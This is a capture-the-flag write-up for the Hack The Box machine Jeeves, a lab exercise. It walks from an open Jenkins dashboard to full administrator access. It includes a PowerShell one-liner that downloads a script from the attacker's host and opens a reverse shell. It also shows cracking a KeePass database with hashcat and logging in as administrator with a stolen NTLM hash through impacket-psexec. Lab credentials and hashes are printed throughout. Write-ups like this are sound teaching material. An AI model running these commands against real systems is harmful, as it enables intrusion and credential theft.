#CTF/HTB/Linux/Medium

# Given Info

>Jeeves is not overly complicated, however it focuses on some interesting techniques and provides a great learning experience. As the use of alternate data streams is not very common, some users may have a hard time locating the correct escalation path.

## IP

10.10.10.63

# What I Learnt

The privesc portion of this box really helped me understand the importance of manual enumeration. I spent quite a bit of time with ADPeass, and trying to get it to run on this machine, and figuring out why it didn't initially. Then I started looking around the box for things that aren't meant to be there by default, and found my way to the escalation which also involved a ton of googling, and learning.

# Writeup

## Enumeration

As usual, I started off with rustscan to see what ports were open using `rustscan -a 10.10.10.63 > enum/rustscan.out`.

```bash
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
50000/tcp open  ibm-db2      syn-ack ttl 127
```

While that was going on, I did an nmap scan in the background looking for service versions and using script scans across all ports. `nmap -sCV -p- -T4 10.10.10.63 -oN enum/nmap.out`

```bash
PORT      STATE SERVICE      REASON          VERSION
80/tcp    open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         syn-ack ttl 127 Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h36m36s, deviation: 0s, median: 4h36m36s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-07-19T10:48:29
|_  start_date: 2025-07-19T10:44:30
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 55172/tcp): CLEAN (Timeout)
|   Check 2 (port 16931/tcp): CLEAN (Timeout)
|   Check 3 (port 48293/udp): CLEAN (Timeout)
|   Check 4 (port 27350/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

The scans showed that there were 4 open ports.

	- rpc(135)
	- smb(445)
	- http(80,50000)

Since rpc needs creds to enumerate, I tried a to check smb for null sessions. I was denied. That left me with http on ports 80, and 50000.

Port 80 led to a search page called ask Jeeves. Nothing interesting on the surface, so I tried to look at the functionality by searching for things, feeling it some sql checks and ooking at its http requests. All it did was push me to an error page so that was out.

Then there was the port 50,000. That led me to an error page as well. The last option was to go for some directory busting. 

![](Assets/Pasted%20image%2020250719141903.png)

For this I used Feroxbuster. Seems like there were a few more links I could check out.

```bash

## Command

┌──(root㉿n0m4d)-[/host_data]
└─# feroxbuster -u http://10.10.10.63:50000 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

## Results after some cleanup

http://10.10.10.63:50000/askjeeves => http://10.10.10.63:50000/askjeeves/
http://10.10.10.63:50000/askjeeves/security => http://10.10.10.63:50000/askjeeves/security/
http://10.10.10.63:50000/askjeeves/about => http://10.10.10.63:50000/askjeeves/about/
http://10.10.10.63:50000/askjeeves/search => http://10.10.10.63:50000/askjeeves/search/
http://10.10.10.63:50000/askjeeves/projects => http://10.10.10.63:50000/askjeeves/projects/
http://10.10.10.63:50000/askjeeves/people => http://10.10.10.63:50000/askjeeves/people/
http://10.10.10.63:50000/askjeeves/signup
http://10.10.10.63:50000/askjeeves/version => http://10.10.10.63:50000/askjeeves/version/
http://10.10.10.63:50000/askjeeves/main
http://10.10.10.63:50000/askjeeves/assets => http://10.10.10.63:50000/askjeeves/assets/
http://10.10.10.63:50000/askjeeves/search/index
http://10.10.10.63:50000/askjeeves/api => http://10.10.10.63:50000/askjeeves/api/
http://10.10.10.63:50000/askjeeves/api/search => http://10.10.10.63:50000/askjeeves/api/search/
http://10.10.10.63:50000/askjeeves/people/users => http://10.10.10.63:50000/askjeeves/people/users/

```

This brought me to a Jenkins dashboard that didn't have a password. So basically anyone who had the link could get there. Initially I started looking for the version in case there was a vulnerability I could exploit, and some time later I discovered that it wasn't that deep.

## Exploit

I created a new project, and set it to run a batch command on build. The idea was that if I could execute the code to get a reverse shell, I'd get into the system that this instance of Jenkins was hosted on. 

This is where the following script came in handy. Its basically telling the service to open powershell on build, and run a command to download the `Invoke-PowerShellTCP.ps1` script from a python http server on my host, then use it to initiate a reverse shell to my attacking host that is listening via netcat.

```powershell

powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:433/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 4433

```

Initially, I tried download the nishang Invoke-PowerShellTCP script from its raw file on github, but this errored out. So I downloaded it onto my host, and spun up a python http server. On a separate terminal session I had netcat listening in for a connection. *Made the mistake of using double quotes with this, and that does not work.*

Then I set this to be the command that runs when I build the project via Jenkins. 

![](Assets/Pasted%20image%2020250719155856.png)

Shortly after that, there was a connection to my http server. The file was downloaded, and just like that I had a low level shell on the target machine.

![](Assets/Pasted%20image%2020250719155822.png)

The user running the machine was called kohsuke, and there were some interesting nuggets on their system. But before all that, the flag was on the desktop.

## Findings

I dug around the machine with kohsuke's account, and came across a file called `secret.key`. Of ourse I got my hands on it and tried to crack it with hashcat. That didn't quite work out, so I was left to dig around the box some more. 

![](Assets/Pasted%20image%2020250719160243.png)

Interestingly enough, there was a KeePass password safe file called `CEH.kdbx` in kohsuke's Documents folder. This is where I hit a snag. 

![](Assets/Pasted%20image%2020250719172933.png)

I tried so many methods of exfiltration, and was on the verge of giving up and pulling out a guide when I noticed something interesting. 

There was a folder called `.jenkins\workspace\test-proj`. Its the folder I was dropped into when I established this shell, and `test-proj` is also the name of the project I created via the Jenkins dashboard. I tested out copying the file to said folder with the following script.

`PS C:\Users\Administrator\.jenkins\workspace\test-proj> copy C:\Users\kohsuke\Documents\CEH.kdbx .`

IT WORKED. I could see the file on the Jenkins site. Which meant that I could download the file to my attacking host.

![](Assets/Pasted%20image%2020250719172854.png)

So I had the file, now I needed to break it to get to whatever was on the inside. For this I used John-The-Ripper. There's a module called `keepass2john` that grabs the hash of a keepass file.

```bash

┌──(root㉿n0m4d)-[/host_data]
└─# keepass2john loot/CEH.kdbx
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe
357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b7
3766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b
68254db431a21ec33298b612fe647db48

```

Next it was time to crack the hash with Hashcat. If you start with `hashcat <unidentified hash> --show`, Hashcat guesses what the hash could be and lets you know what mode to use on it.

In this case it was 13400.

```bash

┌──(root㉿n0m4d)-[/host_data]
└─# hashcat -m 13400 loot/CEH.hash /usr/share/wordlists/rockyou.txt --user

```

That was surprisingly quick, and we got a relatively weak password called `moonshine1`. This is the master password for the keepass file. Next I needed to open said keepass file using this. But I needed a tool to actually do the opening.

![](Assets/Pasted%20image%2020250719173708.png)

Some googling got me to `kpcli` which was a cli utility that enabled me to interact with the keepass file. I got it set up, and then ran it against the file, giving it the password we cracked.

```bash
┌──(root㉿n0m4d)-[/host_data]
└─# kpcli -kdb loot/CEH.kdbx 
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> 
kpcli:/> find .
Searching for "." ...
 - 8 matches found and placed into /_found/
Would you like to list them now? [y/N] 
=== Entries ===
0. Backup stuff                                                           
1. Bank of America                                   www.bankofamerica.com
2. DC Recovery PW                                                         
3. EC-Council                               www.eccouncil.org/programs/cer
4. It's a secret                                 localhost:8180/secret.jsp
5. Jenkins admin                                            localhost:8080
6. Keys to the kingdom                                                    
7. Walmart.com                                             www.walmart.com

```

I briefly went through the help for this tool, and then used `find .` to have it list all the entries it held. From there I used `show-f <entry id>` to list every entry it held.

I needed the passwords and the user names if I was going to build a list to bruteforce a login.

```bash
kpcli:/> show -f 0
                                               
 Path: /CEH/        
Title: Backup stuff                            
Uname: ?                   
 Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
  URL:              
Notes:                     
                                               
kpcli:/> show -f 1
                                               
 Path: /CEH/        
Title: Bank of America                         
Uname: Michael321
 Pass: 12345                
  URL: https://www.bankofamerica.com        
Notes:            
                                                                                               
kpcli:/> show -f 2   
                                               
 Path: /CEH/              
Title: DC Recovery PW                          
Uname: administrator       
 Pass: S1TjAtJHKsugh9oC4VZl
  URL:      
Notes:                     
                                               
kpcli:/> show -f 3
                                               
 Path: /CEH/      
Title: EC-Council                              
Uname: hackerman123
 Pass: pwndyouall!           
  URL: https://www.eccouncil.org/programs/certified-ethical-hacker-ceh
Notes: Personal login

kpcli:/> show -f 4                          
                                               
 Path: /CEH/
Title: It's a secret
Uname: admin
 Pass: F7WhTrSFDKB6sxHU1cUn
  URL: http://localhost:8180/secret.jsp
Notes:

kpcli:/> show -f 5

 Path: /CEH/
Title: Jenkins admin
Uname: admin
 Pass:
  URL: http://localhost:8080
Notes: We don't even need creds! Unhackable!

kpcli:/> show -f 6

 Path: /CEH/
Title: Keys to the kingdom
Uname: bob
 Pass: lCEUnYPjNfIuPZSzOySA
  URL:
Notes:

kpcli:/> show -f 7

 Path: /CEH/
Title: Walmart.com
Uname: anonymous
 Pass: Password
  URL: http://www.walmart.com
Notes: Getting my shopping on
```

Some regex magic helped me make a list of passwords out of this. I noticed the first entry was a hash?

```bash
aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
12345
S1TjAtJHKsugh9oC4VZl
pwndyouall!
F7WhTrSFDKB6sxHU1cUn
lCEUnYPjNfIuPZSzOySA
Password
```

## Privilege Escalation

I decided to use netexec to try and log into the administrator's smb shares using this password list. At the same time I'd try to figure out what this hash was.

![](Assets/Pasted%20image%2020250719181037.png)

Turns out this was an NTLM hash. The first part before the `:` being the LM part, and the second being the NT hash.

>LM is the much less secure hash format used in legacy Windows systems. It’s typically not used, but kept around for backwards compatibility. Many times, the LM hash for the blank password is stored, which is ignored by Windows but allows the field not to be empty. - 0xdf

![](Assets/Pasted%20image%2020250719180635.png)

So maybe I could authenticate to smb using this hash? Just to check if this is a valid login for Administrator.

![](Assets/Pasted%20image%2020250719181652.png)

That seemed to work, so now the issue was trying to create a remote session to the machine using the hash (Passing The Hash). Impacket-psexec is a good choice for this as it takes a hash as a parameter.

`impacket-psexes -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.63 cmd.exe`

![](Assets/Pasted%20image%2020250719182520.png)

So when I connected to this machine I wasn't on Powershell anymore. But a quick check confirmed that I had root auth on this machine. I thought as per usual, the root file is on the desktop but...

## Plot Twist

The only file that was on the desktop was the `hm.txt` file. 

![](Assets/Pasted%20image%2020250719182810.png)

At first glance there doesn't seem to be anything, and honestly this stumped me for a long time. Until I went back to the description of the box for inspiration. 

This is OWASPs page on alternative data streams: https://owasp.org/www-community/attacks/Windows_alternate_data_stream

`dir` is the command used to view the contents of a directory, so I figured it might have an option to view alternate data streams. Consulting the [command reference pages](https://ss64.com/nt/dir.html)gave me the option `/R`.

That showed me an alternate data stream that was hiding the actual root flag. [This blog](https://blog.j2i.net/2021/12/11/working-with-alternative-data-streamsthe-hidden-part-of-your-windows-file-system-on-windows/)showed me how to access the stream (and root flag) using `more < hm.txt:root.txt`.

# Creds

**Jenkins**: 
secret.key : 58d05496da2496d09036d36c99b56f1e89cc662f3e65a4023de71de7e1df8afb

**CEH.kdbx**: 
master pw: moonshine1

**Admin Hash**
aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00

# Proof

![](Assets/Pasted%20image%2020250719160110.png)

![](Assets/Pasted%20image%2020250719183005.png)